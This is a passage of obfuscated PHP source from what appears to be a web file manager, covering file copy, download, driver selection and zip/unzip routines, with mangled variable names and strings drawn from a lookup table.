†ÒÍ–; $ßáĞõ¸Œ = $ß‡˜äÅ; $ß‡˜äÅ = $†‰¡Ü·š->download($”Ùâº“¨, $ß‡˜äÅ); $ß‡˜äÅ = $†‰¡Ü·š->iconvApp($ß‡˜äÅ); if (substr($ß‡˜äÅ, strlen($íˆ¢…ù¶)) == $íˆ¢…ù¶) { $Úã¶ü÷Ä = !0; } $ç°–ßîµ = $Ş²Î™¦->upload($›¥ò©é˜, $ß‡˜äÅ, $Úã¶ü÷Ä); self::remove($ßáĞõ¸Œ); Hook::trigger($›Áì½†®[1165], $†‰¡Ü·š, $”Ùâº“¨, $Ş²Î™¦, $›¥ò©é˜, $€¦—Ä, $ç°–ßîµ); self::copyMoveKeepInfo($†‰¡Ü·š, $”Ùâº“¨, $ç°–ßîµ); return $ç°–ßîµ; } private static function copyMoveKeepInfo($Ö•­´®, $³§²›Šé, $É±Äû•ô) { if (!$É±Äû•ô) { return; } $®¾²ª§ı = $Ö•­´®->info($³§²›Šé); if (!is_array($®¾²ª§ı)) { return; } IO::setModifyTime($É±Äû•ô, $®¾²ª§ı[$_SERVER[ Ö‘ñÄ”][85]]); } public static function pathFather($å ’æˆ) { $ÊÃúåµ‚ = IO::init($å ’æˆ); $˜ û™€ø = $ÊÃúåµ‚->pathFather($ÊÃúåµ‚->path); return $ÊÃúåµ‚->getPathOuter($˜ û™€ø); } public static function fileOut($æ©çƒ£, $„ß°öĞÂ = false, $óĞïª´ = false, $î¦­ŒŸ = '') { $„ù¦Œ¨ = self::driverMake($æ©çƒ£); if ($„ù¦Œ¨->isFileOutServer()) { return $„ù¦Œ¨->fileOutServer($æ©çƒ£, $„ß°öĞÂ, $óĞïª´, $î¦­ŒŸ); } return $„ù¦Œ¨->fileOut($æ©çƒ£, $„ß°öĞÂ, $óĞïª´, $î¦­ŒŸ); } public static function fileOutImage($‡‰ÜàÁ—, $©íš÷èæ = 250) { $´Ö˜‘’× = array(250, 600, 1200, 2000, 3000, 5000); for ($É×ÔŸºÕ = 0; $É×ÔŸºÕ < count($´Ö˜‘’×); $É×ÔŸºÕ++) { if ($É×ÔŸºÕ == 0 && $©íš÷èæ <= $´Ö˜‘’×[$É×ÔŸºÕ]) { $©íš÷èæ = $´Ö˜‘’×[$É×ÔŸºÕ]; break; } else { if ($©íš÷èæ > $´Ö˜‘’×[$É×ÔŸºÕ - 1] && $©íš÷èæ <= $´Ö˜‘’×[$É×ÔŸºÕ]) { $©íš÷èæ = $´Ö˜‘’×[$É×ÔŸºÕ]; break; } else { if ($É×ÔŸºÕ == count($´Ö˜‘’×) - 1 && $©íš÷èæ > $´Ö˜‘’×[$É×ÔŸºÕ]) { $©íš÷èæ = $´Ö˜‘’×[$É×ÔŸºÕ]; break; } } } } $ÚğŠ¥ÌÇ = self::driverMake($‡‰ÜàÁ—); if ($ÚğŠ¥ÌÇ->isFileOutServer()) { return $ÚğŠ¥ÌÇ->fileOutImageServer($‡‰ÜàÁ—, $©íš÷èæ); } return $ÚğŠ¥ÌÇ->fileOutImage($‡‰ÜàÁ—, $©íš÷èæ); } private static function driverIsSame($üŸô¼Ç˜, $îäÄšóÀ) { $¼¢şÌ¬â =& $_SERVER[ Ö‘ñÄ”]; $£ç‚¿ü = $üŸô¼Ç˜->getType(); $ĞŞîÕ‹– = $îäÄšóÀ->getType(); if ($£ç‚¿ü != $ĞŞîÕ‹–) { return !1; } if ($£ç‚¿ü == $¼¢şÌ¬â[771]) { return !0; } if ($£ç‚¿ü == $¼¢şÌ¬â[106]) { return !0; } if ($üŸô¼Ç˜->pathDriver == $îäÄšóÀ->pathDriver) { return !0; } return !1; } public static function copyUpdate($€ÈåÈı, $şª¾‚‰¢) { $é£ÛæªÄ =& $_SERVER[ Ö‘ñÄ”]; if (!IO::exist($€ÈåÈı)) { return !1; } if (!IO::exist($şª¾‚‰¢)) { IO::mkdir($şª¾‚‰¢); } $Æßİûì = self::_listAll($€ÈåÈı); $êÉÏ£›Ú = self::_listAll($şª¾‚‰¢); $İÇÁîÄÉ = array(); $¢ĞüÌüô = array(); foreach ($Æßİûì as $ÕÁ¦á => $û³ŠäŸÄ) { if (isset($êÉÏ£›Ú[$ÕÁ¦á])) { if ($û³ŠäŸÄ[$é£ÛæªÄ[75]] == 1) { continue; } if ($êÉÏ£›Ú[$ÕÁ¦á][$é£ÛæªÄ[76]] == $û³ŠäŸÄ[$é£ÛæªÄ[76]]) { continue; } } if ($û³ŠäŸÄ[$é£ÛæªÄ[75]] == 1) { $¢ĞüÌüô[] = $şª¾‚‰¢ . $é£ÛæªÄ[8] . $ÕÁ¦á; continue; } $ÀúıñÉ¯ = strstr(trim($ÕÁ¦á, $é£ÛæªÄ[8]), $é£ÛæªÄ[8]) ? get_path_father($ÕÁ¦á) : $é£ÛæªÄ[12]; $İÇÁîÄÉ[] = array($é£ÛæªÄ[1166] => $û³ŠäŸÄ[$é£ÛæªÄ[84]], $é£ÛæªÄ[1167] => rtrim($şª¾‚‰¢, $é£ÛæªÄ[8]) . $é£ÛæªÄ[8] . $ÀúıñÉ¯, $é£ÛæªÄ[1168] => $û³ŠäŸÄ); } $Å­¾ÎÅ‹ = array($é£ÛæªÄ[199] => $İÇÁîÄÉ, $é£ÛæªÄ[75] => $¢ĞüÌüô); Hook::trigger($é£ÛæªÄ[1169], $€ÈåÈı, $şª¾‚‰¢, $Å­¾ÎÅ‹); foreach ($¢ĞüÌüô as $û³ŠäŸÄ) { IO::mkdir($û³ŠäŸÄ); } foreach ($İÇÁîÄÉ as $û³ŠäŸÄ) { IO::copy($û³ŠäŸÄ[$é£ÛæªÄ[1166]], $û³ŠäŸÄ[$é£ÛæªÄ[1167]], REPEAT_REPLACE); } } private static function _listAll($œÌø’®Ä) { $•È¢„ú¥ =& $_SERVER[ Ö‘ñÄ”]; $œÌø’®Ä = KodIO::clear($œÌø’®Ä); $‹¯ĞŸï° = IO::listAll($œÌø’®Ä); foreach ($‹¯ĞŸï° as &$ŞõĞùƒ) { $‘èÒò£¾ = substr($ŞõĞùƒ[$•È¢„ú¥[84]], strlen($œÌø’®Ä)); $ŞõĞùƒ[$•È¢„ú¥[1170]] = trim($‘èÒò£¾, $•È¢„ú¥[8]); } unset($ŞõĞùƒ); return array_to_keyvalue($‹¯ĞŸï°, $•È¢„ú¥[1170]); } public static function fileSubstr($€ˆ·©», $ÃÂŠÜ€¢, $ëìŞĞ® = false) { $İ’÷ùÈÁ =& $_SERVER[ Ö‘ñÄ”]; $Âı±šƒ = self::driverMake($€ˆ·©»); $ˆ÷íÇŞÍ = $Âı±šƒ->size($€ˆ·©»); $©û›ê­¡ = $ÃÂŠÜ€¢; $”ÂØ²Ø© = $ëìŞĞ®; if ($ÃÂŠÜ€¢ < 0) { $ÃÂŠÜ€¢ = $ˆ÷íÇŞÍ + $ÃÂŠÜ€¢; } if ($ëìŞĞ® === !1) { $ëìŞĞ® = $ˆ÷íÇŞÍ - $ÃÂŠÜ€¢; } if ($ÃÂŠÜ€¢ + $ëìŞĞ® > $ˆ÷íÇŞÍ) { $ëìŞĞ® = $ˆ÷íÇŞÍ - $ÃÂŠÜ€¢; } if (!$ˆ÷íÇŞÍ && $Âı±šƒ->getType() == $İ’÷ùÈÁ[106] && !$Âı±šƒ->exist($€ˆ·©»)) { $Î÷Õù‰ = get_path_this($€ˆ·©»); $®û¬ÄÊª = parse_url_query($Î÷Õù‰); if (is_array($®û¬ÄÊª) && isset($®û¬ÄÊª[$İ’÷ùÈÁ[32]])) { $Î÷Õù‰ = urldecode($®û¬ÄÊª[$İ’÷ùÈÁ[32]]); } throw new Exception($İ’÷ùÈÁ[1171] . LNG($İ’÷ùÈÁ[1172]) . $İ’÷ùÈÁ[972] . clear_html($Î÷Õù‰) . $İ’÷ùÈÁ[12]); } if ($ëìŞĞ® <= 0) { return $İ’÷ùÈÁ[12]; } if ($ÃÂŠÜ€¢ < 0 || $ÃÂŠÜ€¢ >= $ˆ÷íÇŞÍ || $ëìŞĞ® > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\x52\x65\141\x64\40\145\x72\162\x6f\162\x21\x20\x73\x74\x61\x72\164\75{$ÃÂŠÜ€¢}\x3b\x6c\x65\x6e\147\x74\x68\75{$ëìŞĞ®}\x3b\x20\x73\151\x7a\145\x3d{$ˆ÷íÇŞÍ}\x3b"); } $‰æÊÁ = $Âı±šƒ->fileSubstr($€ˆ·©», $ÃÂŠÜ€¢, $ëìŞĞ®); if (!$‰æÊÁ && $ëìŞĞ® && isset($GLOBALS[$İ’÷ùÈÁ[1173]])) { throw new Exception($GLOBALS[$İ’÷ùÈÁ[1173]][$İ’÷ùÈÁ[1174]]); } return $‰æÊÁ; } private static function driverMake(&$óöĞŸ¡±) { $¿ïö¶ı² =& $_SERVER[ Ö‘ñÄ”]; $éß‘”÷¶ = KodIO::parse($óöĞŸ¡±); if (!self::$driverListSystem) { $İÏĞŠú¡ = Model($¿ïö¶ı²[780])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($İÏĞŠú¡, $¿ïö¶ı²[407]); } if ($éß‘”÷¶[$¿ïö¶ı²[33]] == KodIO::KOD_IO && !self::$driverListSystem[$éß‘”÷¶[$¿ïö¶ı²[407]]]) { return !1; } $óöĞŸ¡± = $éß‘”÷¶[$¿ïö¶ı²[1175]]; $ğªØÉº¥ = self::driverGet($éß‘”÷¶, $óöĞŸ¡±); return $ğªØÉº¥; } private static function driverGet($²œ¥‹ÉÊ, &$çÀé×Ì») { $¾÷Ò¸ô¾ =& $_SERVER[ Ö‘ñÄ”]; $­ï¨Üâæ = $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[1176]]; $ìåúç®ü = $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[407]]; switch ($²œ¥‹ÉÊ[$¾÷Ò¸ô¾[33]]) { case KodIO::KOD_IO: $Ã—‘ò´ = self::$driverListSystem[$ìåúç®ü]; break; case KodIO::KOD_SOURCE: $çÀé×Ì» = $ìåúç®ü . $çÀé×Ì»; $Ã—‘ò´ = array($¾÷Ò¸ô¾[1177] => $¾÷Ò¸ô¾[1178], $¾÷Ò¸ô¾[6] => $²œ¥‹ÉÊ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $šÖ†÷»÷ = $GLOBALS[$¾÷Ò¸ô¾[1179]]; self::$driverListUser = array_to_keyvalue($šÖ†÷»÷, $¾÷Ò¸ô¾[407]); } $Ã—‘ò´ = self::$driverListUser[$ìåúç®ü]; break; case KodIO::KOD_SHARE_LINK: $Ã—‘ò´ = array($¾÷Ò¸ô¾[1177] => $¾÷Ò¸ô¾[1180], $¾÷Ò¸ô¾[6] => $²œ¥‹ÉÊ); $—í‚²„ = Action($¾÷Ò¸ô¾[1181])->sharePathInfo($²œ¥‹ÉÊ[$¾÷Ò¸ô¾[84]]); $çÀé×Ì» = $—í‚²„[$¾÷Ò¸ô¾[410]]; if (!$—í‚²„[$¾÷Ò¸ô¾[410]]) { $¦Šåø…„ = Model($¾÷Ò¸ô¾[609])->getInfo($—í‚²„[$¾÷Ò¸ô¾[497]]); $çÀé×Ì» = KodIO::clear($¦Šåø…„[$¾÷Ò¸ô¾[1182]] . $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[1175]]); $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[495]] = $¦Šåø…„; $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[1157]] = $çÀé×Ì»; $Ã—‘ò´ = array($¾÷Ò¸ô¾[1177] => $¾÷Ò¸ô¾[1183], $¾÷Ò¸ô¾[6] => $²œ¥‹ÉÊ); } break; case KodIO::KOD_SHARE_ITEM: $Ã—‘ò´ = array($¾÷Ò¸ô¾[1177] => $¾÷Ò¸ô¾[1184], $¾÷Ò¸ô¾[6] => $²œ¥‹ÉÊ); $¦Šåø…„ = Model($¾÷Ò¸ô¾[609])->getInfo($²œ¥‹ÉÊ[$¾÷Ò¸ô¾[407]]); if ($¦Šåø…„[$¾÷Ò¸ô¾[410]] == $¾÷Ò¸ô¾[197]) { $çÀé×Ì» = KodIO::clear($¦Šåø…„[$¾÷Ò¸ô¾[1182]] . $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[1175]]); $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[495]] = $¦Šåø…„; $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[1157]] = $çÀé×Ì»; $Ã—‘ò´ = array($¾÷Ò¸ô¾[1177] => $¾÷Ò¸ô¾[1185], $¾÷Ò¸ô¾[6] => $²œ¥‹ÉÊ); } else { if (!$çÀé×Ì») { $çÀé×Ì» = $¦Šåø…„[$¾÷Ò¸ô¾[410]]; } } break; default: $çÀé×Ì» = $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[84]]; $Ã—‘ò´ = array($¾÷Ò¸ô¾[1177] => $¾÷Ò¸ô¾[1186]); break; } $Ó·áœ· = $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[84]]; if (!isset(self::$driverCache[$Ó·áœ·])) { $õ½ÈÍ‰œ = strtolower($Ã—‘ò´[$¾÷Ò¸ô¾[95]]); $…£†Û»ı = $GLOBALS[$¾÷Ò¸ô¾[6]][$¾÷Ò¸ô¾[89]][$¾÷Ò¸ô¾[839]]; $²ñ¹¼Ø€ = $¾÷Ò¸ô¾[74] . (isset($…£†Û»ı[$õ½ÈÍ‰œ]) ? $…£†Û»ı[$õ½ÈÍ‰œ] : ucfirst($õ½ÈÍ‰œ)); if (!class_exists($²ñ¹¼Ø€)) { show_json("{$²ñ¹¼Ø€}\x20\156\x6f\x74\40\145\x78\151\163\164\x73\41", !1); } $”¤Ìâ†ñ = isset($Ã—‘ò´[$¾÷Ò¸ô¾[6]]) ? $Ã—‘ò´[$¾÷Ò¸ô¾[6]] : !1; self::$driverCache[$Ó·áœ·] = new $²ñ¹¼Ø€($”¤Ìâ†ñ); } $¢ä¨Â© = self::$driverCache[$Ó·áœ·]; $¢ä¨Â©->pathDriver = $­ï¨Üâæ; $¢ä¨Â©->pathBase = $¾÷Ò¸ô¾[12]; if (isset($Ã—‘ò´[$¾÷Ò¸ô¾[6]][$¾÷Ò¸ô¾[1187]])) { $¢ä¨Â©->pathBase = rtrim($Ã—‘ò´[$¾÷Ò¸ô¾[6]][$¾÷Ò¸ô¾[1187]], $¾÷Ò¸ô¾[8]) . $¾÷Ò¸ô¾[8]; $çÀé×Ì» = $¢ä¨Â©->pathBase . ltrim($çÀé×Ì», $¾÷Ò¸ô¾[8]); } $çÀé×Ì» = $¢ä¨Â©->getPath($çÀé×Ì»); if (isset($²œ¥‹ÉÊ[$¾÷Ò¸ô¾[1157]])) { $çÀé×Ì» = $²œ¥‹ÉÊ[$¾÷Ò¸ô¾[1157]]; } $¢ä¨Â©->path = $çÀé×Ì»; return $¢ä¨Â©; } public static function errorTips($ã‡É”Î = false) { $İÉõ›¼— =& $_SERVER[ Ö‘ñÄ”]; static $éÚ²ûùŞ = array(); $İŒ«õ = 1000; if ($ã‡É”Î === -1) { return $éÚ²ûùŞ ? $éÚ²ûùŞ[count($éÚ²ûùŞ) - 1] : $İÉõ›¼—[12]; } if ($ã‡É”Î === !1) { return implode($İÉõ›¼—[231], $éÚ²ûùŞ); } if (count($éÚ²ûùŞ) >= $İŒ«õ) { $éÚ²ûùŞ = array_slice($éÚ²ûùŞ, $İŒ«õ * 0.5, $İŒ«õ); } $éÚ²ûùŞ[] = $ã‡É”Î; write_log($İÉõ›¼—[162] . ACTION . $İÉõ›¼—[1188] . $ã‡É”Î, $İÉõ›¼—[1189]); } public static function getLastError($Š‹Àµâ» = '') { $À™ÎÆü = self::errorTips(-1); return $À™ÎÆü ? $À™ÎÆü : $Š‹Àµâ»; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $×³Ï±Ş ; if (!$×³Ï±Ş ) { $¢âíåÇ = IO::init($_SERVER[ Ö‘ñÄ”][8]); } return $¢âíåÇ; } private static function iconvSystem($®ì”ì‹î) { return self::local()->iconvSystem($®ì”ì‹î); } private static function iconvApp($Õ—•ÀËÃ) { return self::local()->iconvApp($Õ—•ÀËÃ); } public static function zip($ÛæŞ„öô, $°ùöõºû = "\x7a\151\160", $Øà¨î‡Ø = '', $öÓğîëÒ = REPEAT_RENAME) { $ÚãçıÔ¡ =& $_SERVER[ Ö‘ñÄ”]; $øÓ´Ÿ³Å = self::init($ÛæŞ„öô[0][$ÚãçıÔ¡[84]]); $ —Á£ÁĞ = self::info($ÛæŞ„öô[0][$ÚãçıÔ¡[84]]); $Ÿì»Š‡ú = !1; if (!$Øà¨î‡Ø && $øÓ´Ÿ³Å->getType() == $ÚãçıÔ¡[106]) { $¡ûÒÓ„Ï = self::zipFileList($ÛæŞ„öô); } else { $Ÿì»Š‡ú = $Øà¨î‡Ø ? $Øà¨î‡Ø : TEMP_FILES . $ÚãçıÔ¡[1190] . time() . rand_string(8) . $ÚãçıÔ¡[8]; mk_dir($Ÿì»Š‡ú); $¡ûÒÓ„Ï = self::zipFileList($ÛæŞ„öô, $Ÿì»Š‡ú); } $õë©€úœ = $ —Á£ÁĞ[$ÚãçıÔ¡[32]]; if (count($¡ûÒÓ„Ï) > 1) { $½ª„öÁÏ = IO::info(IO::pathFather($ —Á£ÁĞ[$ÚãçıÔ¡[84]])); $õë©€úœ = $½ª„öÁÏ[$ÚãçıÔ¡[32]]; } $ıÛ¬¸úÆ = $Ÿì»Š‡ú; if (!$ıÛ¬¸úÆ) { $ıÛ¬¸úÆ = get_path_father($ —Á£ÁĞ[$ÚãçıÔ¡[84]]); if (!$Øà¨î‡Ø && $øÓ´Ÿ³Å->getType() == $ÚãçıÔ¡[106]) { $ıÛ¬¸úÆ = get_path_father($øÓ´Ÿ³Å->path); } $¤åĞõÈ¤ = IO::info($ıÛ¬¸úÆ); if (!$¤åĞõÈ¤[$ÚãçıÔ¡[202]]) { show_json(LNG($ÚãçıÔ¡[1191]), !1); } } $ğıÓìé¤ = $ıÛ¬¸úÆ . $õë©€úœ . $ÚãçıÔ¡[10] . $°ùöõºû; $ğıÓìé¤ = get_filename_auto($ğıÓìé¤, $ÚãçıÔ¡[12], $öÓğîëÒ); $ÙÆ‹£ ş = self::iconvSystem($ğıÓìé¤); foreach ($¡ûÒÓ„Ï as $ˆË•Óæµ => $øİ’ÎÚ¨) { $¡ûÒÓ„Ï[$ˆË•Óæµ] = self::iconvSystem($øİ’ÎÚ¨); } KodArchive::create($ÙÆ‹£ ş, $¡ûÒÓ„Ï); if (!IO::exist($ğıÓìé¤)) { if ($Ÿì»Š‡ú) { del_dir($Ÿì»Š‡ú); } show_json(LNG($ÚãçıÔ¡[1192]), !1); } if ($Øà¨î‡Ø || !$Ÿì»Š‡ú) { if ($Ÿì»Š‡ú && strstr($Ÿì»Š‡ú, TEMP_FILES)) { $®ª¥Î¯± = $¡ûÒÓ„Ï = array(); recursion_dir($ıÛ¬¸úÆ, $®ª¥Î¯±, $¡ûÒÓ„Ï, 0); foreach ($®ª¥Î¯± as $á¹ÏÜ»¨) { del_dir($á¹ÏÜ»¨); } foreach ($¡ûÒÓ„Ï as $¡á„ıšÚ) { if ($¡á„ıšÚ == $ÙÆ‹£ ş) { continue; } del_file($¡á„ıšÚ); } } return $ğıÓìé¤; } $Û¾õ¦İ¨ = self::pathFather($ —Á£ÁĞ[$ÚãçıÔ¡[84]]); $Äçû‰Šù = self::move($ğıÓìé¤, $Û¾õ¦İ¨, $öÓğîëÒ); if (!$Äçû‰Šù) { del_dir($Ÿì»Š‡ú); show_json(LNG($ÚãçıÔ¡[1192]), !1); } del_dir($Ÿì»Š‡ú); return $Äçû‰Šù; } public static function unzip($¾‚ù»‡Ê, $’•ÃÌï = "\162\145\160\x6c\x61\143\145") { $¢¼É‚º =& $_SERVER[ Ö‘ñÄ”]; $®Úº£àô = $¾‚ù»‡Ê[$¢¼É‚º[84]]; $§îÙŸ¹ = $¾‚ù»‡Ê[$¢¼É‚º[1193]]; if (!($ª¢áóïš = parent::info($®Úº£àô))) { show_json(LNG($¢¼É‚º[1194]), !1); } if (!($Ş³‘ç¦ = parent::infoFull($§îÙŸ¹))) { $§îÙŸ¹ = parent::mkdir($§îÙŸ¹); $Ş³‘ç¦ = array($¢¼É‚º[84] => $§îÙŸ¹); } else { if (isset($Ş³‘ç¦[$¢¼É‚º[410]]) && trim($Ş³‘ç¦[$¢¼É‚º[84]], $¢¼É‚º[8]) != trim($§îÙŸ¹, $¢¼É‚º[8])) { $ ´üô§ = KodIO::make($Ş³‘ç¦[$¢¼É‚º[440]]); $›‚ÏÏ€ = parent::fileNameAuto($ ´üô§, $Ş³‘ç¦[$¢¼É‚º[32]], REPEAT_RENAME_FOLDER, !0); $§îÙŸ¹ = parent::mkdir($ ´üô§ . $›‚ÏÏ€); $Ş³‘ç¦ = array($¢¼É‚º[84] => $§îÙŸ¹); } } $§îÙŸ¹ = $Ş³‘ç¦[$¢¼É‚º[84]]; $ÛÌ²Ñ³„ = self::tmpFileName($ª¢áóïš); $º›õŞì = TEMP_FILES . $ÛÌ²Ñ³„; del_dir($º›õŞì); mk_dir($º›õŞì); $ˆŞšÄ‰¯ = self::fileExt($ª¢áóïš); $§®É Áç = $º›õŞì . $¢¼É‚º[10] . $ˆŞšÄ‰¯; if (!@file_exists(self::iconvSystem($§®É Áç))) { $ü‰ö®˜î = self::localFilePath($®Úº£àô, $ˆŞšÄ‰¯); $§®É Áç = $ü‰ö®˜î ? $ü‰ö®˜î : parent::download($®Úº£àô, $§®É Áç); } $§®É Áç = self::iconvSystem($§®É Áç); $¯é§‹–â = isset($¾‚ù»‡Ê[$¢¼É‚º[1195]]) ? $¾‚ù»‡Ê[$¢¼É‚º[1195]] : $¢¼É‚º[1196]; $çäıÎ¬ß = KodArchive::extract($§®É Áç, $º›õŞì . $¢¼É‚º[8], $¯é§‹–â); self::archiveExt(); if (!$çäıÎ¬ß[$¢¼É‚º[1197]]) { show_json($¢¼É‚º[1198] . $çäıÎ¬ß[$¢¼É‚º[1199]], !1); } Hook::trigger($¢¼É‚º[1200], $º›õŞì); recursion_dir($º›õŞì, $Š¨  Ü˜, $ÆŒ¾§šÄ, 0); $İ¯ı¯–á = array_merge($Š¨  Ü˜, $ÆŒ¾§šÄ); foreach ($İ¯ı¯–á as $ô¶½Õå€) { $ô¶½Õå€ = self::iconvApp($ô¶½Õå€); self::move($ô¶½Õå€, $§îÙŸ¹, $’•ÃÌï); } del_dir($º›õŞì); if (!$ü‰ö®˜î) { del_file($§®É Áç); } return !0; } public static function unzipList($ü£‰ô) { $»š¨ƒ¥ê =& $_SERVER[ Ö‘ñÄ”]; $ûŒò·Ë€ = $ü£‰ô[$»š¨ƒ¥ê[84]]; $ş ş½¶– = isset($ü£‰ô[$»š¨ƒ¥ê[1201]]) ? $ü£‰ô[$»š¨ƒ¥ê[1201]] : -1; $‹î‡øŒ = 50000; if (request_url_safe($ûŒò·Ë€)) { $‚ÑÌ›İ = parse_url_query($ûŒò·Ë€); if (!isset($‚ÑÌ›İ[$»š¨ƒ¥ê[84]])) { show_json($»š¨ƒ¥ê[1202], !1); } } $Ç§ŞŒò¥ = isset($‚ÑÌ›İ) ? $‚ÑÌ›İ[$»š¨ƒ¥ê[84]] : $ûŒò·Ë€; $ùã‰øüû = self::info($Ç§ŞŒò¥); $Ã÷¯ÕÈ® = self::fileExt($ùã‰øüû); $”Û¾û¦’ = self::tmpFileName($ùã‰øüû); if (isset($‚ÑÌ›İ)) { $Ÿ›Ç­ù¦ = array($‚ÑÌ›İ[$»š¨ƒ¥ê[84]], $‚ÑÌ›İ[$»š¨ƒ¥ê[1201]], $‚ÑÌ›İ[$»š¨ƒ¥ê[32]]); $óÑ½ıª° = md5(implode($»š¨ƒ¥ê[11], $Ÿ›Ç­ù¦)) . $»š¨ƒ¥ê[10] . get_path_ext($‚ÑÌ›İ[$»š¨ƒ¥ê[32]]); } else { $Ÿ›Ç­ù¦ = array($ùã‰øüû[$»š¨ƒ¥ê[32]], $ùã‰øüû[$»š¨ƒ¥ê[84]], $ùã‰øüû[$»š¨ƒ¥ê[76]]); $óÑ½ıª° = md5(implode($»š¨ƒ¥ê[11], $Ÿ›Ç­ù¦)) . $»š¨ƒ¥ê[10] . $Ã÷¯ÕÈ®; } if ($ş ş½¶– == -1) { $äİ¥Ì¢ö = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\x69\x65\x77\x2f{$”Û¾û¦’}\57{$óÑ½ıª°}\56\154\157\147"; $¥¾˜ê¬ = self::infoFull($äİ¥Ì¢ö); if ($¥¾˜ê¬) { $äİ¥Ì¢ö = $¥¾˜ê¬[$»š¨ƒ¥ê[84]]; $€í×¾¦é = self::getContent($äİ¥Ì¢ö); if ($€í×¾¦é) { $Ø¸½èŠ‘ = json_decode($€í×¾¦é, !0); $Ø¸½èŠ‘ = is_array($Ø¸½èŠ‘) ? $Ø¸½èŠ‘ : array(); if (count($Ø¸½èŠ‘) >= $‹î‡øŒ) { show_json(sprintf(LNG($»š¨ƒ¥ê[1203]), count($Ø¸½èŠ‘)), !1); } return $Ø¸½èŠ‘; } } else { $äİ¥Ì¢ö = self::mkfile($äİ¥Ì¢ö); } } $ê¡¤¨è¶ = TEMP_FILES . $”Û¾û¦’; if (!is_dir($ê¡¤¨è¶)) { mk_dir($ê¡¤¨è¶); } $Ç†œûœƒ = $ê¡¤¨è¶ . $»š¨ƒ¥ê[8] . $óÑ½ıª°; if (!@file_exists(self::iconvSystem($Ç†œûœƒ))) { if (isset($‚ÑÌ›İ)) { url_request($ûŒò·Ë€, $»š¨ƒ¥ê[1204], $Ç†œûœƒ); } else { $ó¨¤ëÏ¨ = self::localFilePath($ûŒò·Ë€, $Ã÷¯ÕÈ®); $Ç†œûœƒ = $ó¨¤ëÏ¨ ? $ó¨¤ëÏ¨ : self::download($ûŒò·Ë€, $Ç†œûœƒ); } } $Ç†œûœƒ = self::iconvSystem($Ç†œûœƒ); if ($ş ş½¶– >= 0) { $Å–¾ºˆº = isset($ü£‰ô[$»š¨ƒ¥ê[1205]]) ? $ü£‰ô[$»š¨ƒ¥ê[1205]] : !1; $À²ªÅ¼ß = isset($ü£‰ô[$»š¨ƒ¥ê[32]]) ? $ü£‰ô[$»š¨ƒ¥ê[32]] : $»š¨ƒ¥ê[12]; KodArchive::filePreview($Ç†œûœƒ, $ş ş½¶–, $Å–¾ºˆº, $À²ªÅ¼ß); self::archiveExt(); die; } $ó‰©˜Ö— = KodArchive::listContent($Ç†œûœƒ); self::archiveExt(); del_dir($ê¡¤¨è¶); if (!$ó‰©˜Ö—[$»š¨ƒ¥ê[1197]]) { show_json($ó‰©˜Ö—[$»š¨ƒ¥ê[1199]], !1); } $Ø¸½èŠ‘ = json_encode($ó‰©˜Ö—[$»š¨ƒ¥ê[1199]]); self::setContent($äİ¥Ì¢ö, $Ø¸½èŠ‘); if (count($ó‰©˜Ö—[$»š¨ƒ¥ê[1199]]) >= $‹î‡øŒ) { show_json(sprintf(LNG($»š¨ƒ¥ê[1203]), count($ó‰©˜Ö—[$»š¨ƒ¥ê[1199]])), !1); } return $ó‰©˜Ö—[$»š¨ƒ¥ê[1199]]; } private static function fileExt($ß°­şÊ) { $õÂÑºğú =& $_SERVER[ Ö‘ñÄ”]; $§Ô£ÄŒä = $ß°­şÊ[$õÂÑºğú[174]]; if ($§Ô£ÄŒä == $õÂÑºğú[1206]) { $¶•¼ó€¤ = $õÂÑºğú[1207]; if (substr($ß°­şÊ[$õÂÑºğú[32]], -strlen($¶•¼ó€¤)) == $¶•¼ó€¤) { $§Ô£ÄŒä = $õÂÑºğú[1208]; } } self::archiveExt($§Ô£ÄŒä); return $§Ô£ÄŒä; } private static function zipFileList($ùœõ¸‹¨, $ÄÆÏë¿¡ = false) { $²ˆåõ¾‘ =& $_SERVER[ Ö‘ñÄ”]; $Œ”Ÿ×Ÿ” = array(); foreach ($ùœõ¸‹¨ as $ïœ’×£·) { $ƒ”¦Ş× = $ïœ’×£·[$²ˆåõ¾‘[84]]; if ($ÄÆÏë¿¡) { $ƒ”¦Ş× = self::copy($ïœ’×£·[$²ˆåõ¾‘[84]], $ÄÆÏë¿¡, $²ˆåõ¾‘[831]); } else { $²ƒ¿©«¹ = self::init($ïœ’×£·[$²ˆåõ¾‘[84]]); if ($²ƒ¿©«¹->getType() == $²ˆåõ¾‘[106]) { $ƒ”¦Ş× = $²ƒ¿©«¹->path; } } if ($ƒ”¦Ş× && self::local()->exist($ƒ”¦Ş×)) { $Œ”Ÿ×Ÿ”[$ïœ’×£·[$²ˆåõ¾‘[84]]] = $ƒ”¦Ş×; } } if (!empty($Œ”Ÿ×Ÿ”)) { return array_values($Œ”Ÿ×Ÿ”); } show_json(LNG($²ˆåõ¾‘[1172]), !1); } public static function tmpFileName($ƒ¨‘›’) { $øÒÖÏáÇ =& $_SERVER[ Ö‘ñÄ”]; $ë œ¾ƒö = array($ƒ¨‘›’[$øÒÖÏáÇ[32]], $ƒ¨‘›’[$øÒÖÏáÇ[84]], $ƒ¨‘›’[$øÒÖÏáÇ[76]], $ƒ¨‘›’[$øÒÖÏáÇ[529]]); return md5(implode($øÒÖÏáÇ[11], $ë œ¾ƒö)); } private static function localFilePath($ñ—¾£æã, $Áóãä™) { $€ûá¾”´ =& $_SERVER[ Ö‘ñÄ”]; if ($Áóãä™ == $€ûá¾”´[1209] && strtoupper(substr(PHP_OS, 0, 3)) == $€ûá¾”´[1210]) { return !1; } $ïæğñëĞ = KodIO::parse($ñ—¾£æã); if ($ïæğñëĞ[$€ûá¾”´[33]] == KodIO::KOD_SOURCE) { $âÅÊ¤Ø = Model($€ûá¾”´[838])->fileInfoGet(KodIO::sourceID($ñ—¾£æã)); if 